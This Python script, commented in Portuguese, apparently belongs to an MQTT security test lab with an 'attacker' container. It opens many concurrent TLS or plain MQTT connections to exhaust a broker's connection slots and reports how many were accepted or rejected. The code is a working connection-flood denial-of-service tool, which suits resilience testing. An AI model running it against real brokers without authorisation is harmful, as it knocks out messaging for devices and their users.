#!/usr/bin/env python3
"""Abre N conexões MQTT simultâneas para esgotar slots de conexão do broker.

Diferente do injetor (que mede rejeição de UMA conexão sem certificado de
cliente), aqui o objetivo é volume: quantas conexões concorrentes o broker
aceita antes de recusar/derrubar novas tentativas. Reaproveita deliberadamente
o padrão de `injector.py` (espera de CONNACK via on_connect/on_disconnect +
threading.Event, TLS sem certificado de cliente) porque a mesma justificativa
se aplica, só que multiplicada por N conexões concorrentes.
"""

import dataclasses
import json
import os
import ssl
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path
from typing import List, Optional, Tuple

import paho.mqtt.client as mqtt

from args_connection_flood import ConnectionFloodArgs, parse_args

REPO_ROOT = Path(__file__).resolve().parent.parent.parent
# Mesma lógica de injector.py: precisa funcionar tanto rodando do host (testes
# de integração) quanto dentro do container attacker (ATTACKER_CA_PATH, ver
# docker-compose.yml). Duplicada aqui (em vez de importada) para manter este
# script autocontido, como injector.py já é.
CA_PATH = Path(
    os.environ.get(
        "ATTACKER_CA_PATH",
        str(REPO_ROOT / "infra" / "mosquitto" / "secure" / "certs" / "ca.crt"),
    )
)

MAX_REPORTED_ERRORS = 5


@dataclass
class ConnectionFloodResult:
    target: str
    host: str
    port: int
    connections_attempted: int
    connections_established: int
    connections_rejected: int
    success_rate: Optional[float]
    errors: List[str]
    started_at: str
    finished_at: str


def _build_client(args: ConnectionFloodArgs, index: int) -> mqtt.Client:
    client = mqtt.Client(
        mqtt.CallbackAPIVersion.VERSION2,
        client_id=f"{args.client_id_prefix}-{index}-{args.target}",
    )
    if args.username is not None or args.password is not None:
        client.username_pw_set(args.username, args.password)

    if args.target == "secure":
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        context.minimum_version = ssl.TLSVersion.TLSv1_2
        context.load_verify_locations(cafile=str(CA_PATH))
        # Sem load_cert_chain de propósito: o flood não possui certificado de
        # cliente, igual ao injetor.
        context.check_hostname = False
        client.tls_set_context(context)

    return client


def _open_one(args: ConnectionFloodArgs, index: int) -> Tuple[Optional[mqtt.Client], Optional[str]]:
    """Abre uma conexão e espera pelo CONNACK, sem confiar em connect() sozinho.

    client.connect() só abre o socket; a confirmação (ou rejeição) chega de
    forma assíncrona via on_connect/on_disconnect no loop — o mesmo motivo
    documentado em injector.py, agravado aqui porque estamos disparando N
    conexões ao mesmo tempo e um falso positivo por conexão infla a taxa de
    sucesso reportada.
    """
    established = threading.Event()
    outcome: dict = {"reason": None, "connected": False}

    def on_connect(client, userdata, flags, reason_code, properties=None):
        outcome["reason"] = reason_code
        outcome["connected"] = not reason_code.is_failure
        established.set()

    def on_disconnect(client, userdata, *rest):
        established.set()

    try:
        client = _build_client(args, index)
    except Exception as exc:
        return None, f"erro ao montar cliente: {exc}"

    client.on_connect = on_connect
    client.on_disconnect = on_disconnect

    try:
        client.connect(args.host, args.port, keepalive=max(30, int(args.hold_seconds) + 30))
        client.loop_start()
    except Exception as exc:
        return None, f"erro ao conectar: {exc}"

    if not established.wait(timeout=args.connect_timeout) or not outcome["connected"]:
        client.loop_stop()
        try:
            client.disconnect()
        except Exception:
            pass
        reason = outcome["reason"]
        detail = str(reason) if reason is not None else "handshake abortado (sem CONNACK)"
        return None, f"conexão não estabelecida: {detail}"

    return client, None


def run(args: ConnectionFloodArgs) -> ConnectionFloodResult:
    started_at = datetime.now(timezone.utc).isoformat()

    established_clients: List[mqtt.Client] = []
    errors: List[str] = []
    attempted = 0
    established_count = 0

    try:
        with ThreadPoolExecutor(max_workers=max(1, args.connections)) as executor:
            futures = [
                executor.submit(_open_one, args, i) for i in range(args.connections)
            ]
            for future in as_completed(futures):
                attempted += 1
                client, error = future.result()
                if client is not None:
                    established_count += 1
                    established_clients.append(client)
                elif error is not None and len(errors) < MAX_REPORTED_ERRORS:
                    if error not in errors:
                        errors.append(error)

        if args.hold_seconds > 0 and established_clients:
            time.sleep(args.hold_seconds)
    finally:
        for client in established_clients:
            client.loop_stop()
            try:
                client.disconnect()
            except Exception:
                pass

    rejected = attempted - established_count
    return ConnectionFloodResult(
        target=args.target,
        host=args.host,
        port=args.port,
        connections_attempted=attempted,
        connections_established=established_count,
        connections_rejected=rejected,
        success_rate=established_count / attempted if attempted else None,
        errors=errors,
        started_at=started_at,
        finished_at=datetime.now(timezone.utc).isoformat(),
    )


def main(argv=None) -> int:
    args = parse_args(argv)
    print(
        f"[{args.target}] abrindo {args.connections} conexões simultâneas em "
        f"{args.host}:{args.port} (hold={args.hold_seconds}s, "
        f"timeout={args.connect_timeout}s)",
        file=sys.stderr,
    )

    try:
        result = run(args)
    except Exception as exc:
        # Falhas individuais de CONNECT são esperadas e contabilizadas em
        # result.errors; só uma exceção inesperada na orquestração do flood em
        # si (fora do escopo de cada conexão) é motivo para saída não-zero.
        print(f"[{args.target}] erro inesperado ao rodar o flood: {exc}", file=sys.stderr)
        return 1

    print(
        f"[{args.target}] conexões estabelecidas: "
        f"{result.connections_established}/{result.connections_attempted} "
        f"(taxa {result.success_rate})",
        file=sys.stderr,
    )

    print(json.dumps(dataclasses.asdict(result)))

    return 0


if __name__ == "__main__":
    sys.exit(main())
